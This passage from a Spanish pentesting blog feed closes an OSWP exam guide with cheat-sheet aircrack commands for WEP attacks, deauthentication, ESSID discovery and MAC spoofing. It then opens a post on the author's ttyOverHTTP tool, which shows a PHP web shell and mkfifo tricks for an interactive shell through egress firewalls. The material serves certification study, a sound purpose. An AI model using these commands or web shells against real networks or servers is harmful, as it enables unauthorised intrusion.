   63 3.304134536 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1379, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   98 4.671950803 Apple_48:66:14 → Broadcast    802.11 213 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1113, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  100 4.682076898 Apple_48:66:14 → Broadcast    802.11 213 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1114, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Perfecto, pues de estos paquetes, siempre el primero emitido antes de empezar con la fase de asociación emite
por defecto el &lt;strong&gt;ESSID&lt;/strong&gt; de la red en texto claro, de manera no oculta y transparente para el atacante.&lt;/p&gt;

&lt;p&gt;De esta forma, podemos ser capaces de extraer el &lt;strong&gt;ESSID&lt;/strong&gt; de la red tras aplicar un ataque de
de-autenticación sobre una de las estaciones presentes. ¿Pero qué es lo bueno de esto?, que ni nosotros
tenemos que hacer el trabajo. Una vez la propia suite de &lt;strong&gt;aircrack&lt;/strong&gt; detecta estos paquetes Probe, los parsea
en busca del &lt;strong&gt;ESSID&lt;/strong&gt; de la red oculta. En caso de obtenerla, sustituye el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;length: 0&amp;gt;&lt;/code&gt; por el &lt;strong&gt;ESSID&lt;/strong&gt; descubierto, automáticamente.&lt;/p&gt;

&lt;h2 id=&quot;redes-wep&quot;&gt;Redes WEP&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;IMPORTANTE: En este punto, no entraré tanto al detalle como en las redes de protocolo WPA. ¿Por qué?, porque
ya para eso tienes todo el material necesario que te entregan tras cursar la certificación, que se orienta a
vulnerar el protocolo WEP. Todo lo visto hasta ahora, han sido técnicas que os quería compartir sobre el
protocolo WPA/WPA2, ya que es el más usado a día de hoy y el que con más frecuencia nos vamos a encontrar en nuestro entorno.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Aún así, dejo un &lt;strong&gt;Cheat Sheet&lt;/strong&gt; para cada uno de los casos.&lt;/p&gt;

&lt;h3 id=&quot;fake-authentication-attack&quot;&gt;Fake Authentication Attack&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng –c &amp;lt;Canal_AP&amp;gt; &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;nombreCaptura&amp;gt; wlan0mon
&lt;span class=&quot;c&quot;&gt;# Identificamos nuestra MAC&lt;/span&gt;
s4vitar@parrot:~# macchanger &lt;span class=&quot;nt&quot;&gt;--show&lt;/span&gt; wlan0mon
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;nuestraMAC&amp;gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &amp;lt;ESSID&amp;gt; wlan0mon
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt; –p 0841 –c FF:FF:FF:FF:FF:FF –b &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;nuestraMAC&amp;gt; wlan0mon
s4vitar@parrot:~# aircrack-ng –b &amp;lt;BSSID&amp;gt; &amp;lt;archivoPCAP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;arp-replay-attack&quot;&gt;ARP Replay Attack&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng –c &amp;lt;Canal_AP&amp;gt; &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;nombreCaptura&amp;gt; wlan0mon
&lt;span class=&quot;c&quot;&gt;# Identificamos nuestra MAC&lt;/span&gt;
s4vitar@parrot:~# macchanger &lt;span class=&quot;nt&quot;&gt;--show&lt;/span&gt; wlan0mon
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-3&lt;/span&gt; –x 1000 –n 1000 –b &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;nuestraMAC&amp;gt; wlan0mon
s4vitar@parrot:~# aircrack-ng –b &amp;lt;BSSID&amp;gt; &amp;lt;archivoPCAP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;chop-chop-attack&quot;&gt;Chop Chop Attack&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng –c &amp;lt;Canal_AP&amp;gt; &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;nombreArchivo&amp;gt; wlan0mon
&lt;span class=&quot;c&quot;&gt;# Identificamos nuestra MAC&lt;/span&gt;
s4vitar@parrot:~# macchanger &lt;span class=&quot;nt&quot;&gt;--show&lt;/span&gt; wlan0mon
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; 0 –e &amp;lt;ESSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;nuestraMAC&amp;gt; wlan0mon
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt; –b &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;nuestraMAC&amp;gt; wlan0mon
 &lt;span class=&quot;c&quot;&gt;# Presionamos ‘y’ ;&lt;/span&gt;
s4vitar@parrot:~# packetforge-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; –a &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;nuestraMAC&amp;gt; &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &amp;lt;SourceIP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &amp;lt;DestinationIP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &amp;lt;XOR_PacketFile&amp;gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;FileName2&amp;gt;
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt; –r &amp;lt;FileName2&amp;gt; wlan0mon
s4vitar@parrot:~# aircrack-ng &amp;lt;archivoPCAP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;fragmentation-attack&quot;&gt;Fragmentation Attack&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng –c &amp;lt;Canal_AP&amp;gt; &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;nombreArchivo&amp;gt; wlan0mon
&lt;span class=&quot;c&quot;&gt;# Identificamos nuestra MAC&lt;/span&gt;
s4vitar@parrot:~# macchanger &lt;span class=&quot;nt&quot;&gt;--show&lt;/span&gt; wlan0mon
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; 0 –e &amp;lt;ESSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;nuestraMAC&amp;gt; wlan0mon
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-5&lt;/span&gt; –b&amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;nuestraMAC &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; wlan0mon
&lt;span class=&quot;c&quot;&gt;# Presionamos ‘y’ ;&lt;/span&gt;
s4vitar@parrot:~# packetforge-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; –a &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;nuestraMAC&amp;gt; &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &amp;lt;SourceIP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &amp;lt;DestinationIP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &amp;lt;XOR_PacketFile&amp;gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;FileName2&amp;gt;
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt; –r &amp;lt;FileName2&amp;gt; wlan0mon
s4vitar@parrot:~# aircrack-ng &amp;lt;archivoPCAP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ska-type-cracking&quot;&gt;SKA Type Cracking&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4vitar@parrot:~# airmon-ng start wlan0
s4vitar@parrot:~# airodump-ng –c &amp;lt;Canal_AP&amp;gt; &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;nombreArchivo&amp;gt; wlan0mon
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; 10 –a &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &amp;lt;macVictima&amp;gt; wlan0mon
s4vitar@parrot:~# ifconfig wlan0mon down
s4vitar@parrot:~# macchanger –-mac &amp;lt;macVictima&amp;gt; wlan0mon
s4vitar@parrot:~# ifconfig wlan0mon up
s4vitar@parrot:~# aireplay-ng &lt;span class=&quot;nt&quot;&gt;-3&lt;/span&gt; –b &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;macFalsa&amp;gt; wlan0mon
s4vitar@parrot:~# aireplay-ng –-deauth 1 –a &amp;lt;BSSID&amp;gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &amp;lt;macFalsa&amp;gt; wlan0mon
s4vitar@parrot:~# aircrack-ng &amp;lt;archivoPCAP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Certificaciones" /><category term="OSWP" /><category term="Offensive Security" /><category term="Pentesting" /><category term="Examen" /><category term="Guías" /><summary type="html">Para aquellos interesados en certificarse de OSWP, por aquí os dejo una guía hecha por mi donde de manera desglosada comentamos cada uno de los puntos importantes a tener en cuenta de cara a la examinación.</summary></entry><entry><title type="html">ttyOverHTTP - Herramienta</title><link href="http://localhost:4000/ttyoverhttp/" rel="alternate" type="text/html" title="ttyOverHTTP - Herramienta" /><published>2020-02-04T00:00:00+01:00</published><updated>2020-02-04T00:00:00+01:00</updated><id>http://localhost:4000/ttyoverhttp</id><content type="html" xml:base="http://localhost:4000/ttyoverhttp/">&lt;p&gt;&lt;img src=&quot;/assets/images/ttyOverHTTP/linux-banner.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podéis encontrar esta herramienta en el siguiente enlace:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/s4vitar/ttyoverhttp&quot;&gt;https://github.com/s4vitar/ttyoverhttp&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;qué-es-ttyoverhttp&quot;&gt;¿Qué es ttyOverHTTP?&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;ttyOverHTTP&lt;/strong&gt; no es más que una herramienta de utilidad la cual nos permitirá en base a una webshell, sin la necesidad de entablarnos una reverse shell, contar con una TTY completamente interactiva, haciendo uso para ello de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfifo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para los que no entiendan la problemática de las webshells, podéis probarlo por vuestra cuenta… simplemente montad un servidor apache y alojad este recurso PHP en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/cmd.php&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como es de esperar, a través de la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd&lt;/code&gt; está más que claro que vamos a ser capaces de ejecutar comandos a nivel de sistema como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ttyOverHTTP/first-webserver.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Sin embargo, fijaros qué es lo que pasa si tratamos por ejemplo de efectuar una migración de usuario:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ttyOverHTTP/second-webserver.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;No podemos introducir la contraseña del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, cosa que podríamos hacer si hiciéramos un tratamiento de la TTY desde consola, ya sabéis… el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stty raw -echo&lt;/code&gt; y toda la movida.&lt;/p&gt;

&lt;p&gt;De la misma forma, tampoco podemos correr desde una webshell el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql&lt;/code&gt; o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt; en modo interactivo, ni hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; para introducir la contraseña. Tampoco podemos hacer desplazamientos entre directorios, me refiero… si hacemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwd&lt;/code&gt; veremos la ruta actual en la que nos situamos, pero si luego enviamos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd /home&lt;/code&gt; y volvemos en la siguiente consulta a hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwd&lt;/code&gt; veremos que seguiremos en el mismo directorio inicial, no habiéndose efectuado el desplazamiento.&lt;/p&gt;

&lt;p&gt;Todo esto sucede porque básicamente no estamos en una TTY, podemos comprobarlo de la siguiente forma:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/ttyOverHTTP/third-webserver.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Entonces bien, ¿qué hacemos en estos casos?, porque si nos entabláramos una Reverse Shell obviamente ya todo estaría hecho, ¿pero y si por iptables hay ciertas reglas configuradas tanto por ipv4 como por ipv6 que impiden conexiones salientes para entablarnos nuestra conexión?.&lt;/p&gt;

&lt;p&gt;Efectivamente, se nos complica un poco la labor.&lt;/p&gt;

&lt;h2 id=&quot;movimiento-lateral&quot;&gt;Movimiento lateral&lt;/h2&gt;

&lt;p&gt;En Linux, hay una utilidad que nos permite crear archivos &lt;strong&gt;FIFO&lt;/strong&gt;. Un fichero FIFO es similar a una interconexión o tubería, excepto en que se crea de una forma distinta. En vez de ser un canal de comunicaciones anónimo, un fichero especial FIFO se mete en el sistema de ficheros mediante una llamada a &lt;strong&gt;mkfifo&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Veamos un ejemplo práctico de su uso. Por un lado desde terminal, haremos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mkfifo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Esto se quedará en escucha, por lo que posteriormente deberemos abrir una nueva consola aparte para hacer las pruebas. Ahora haremos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;whoami&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pwd&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cd ..&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
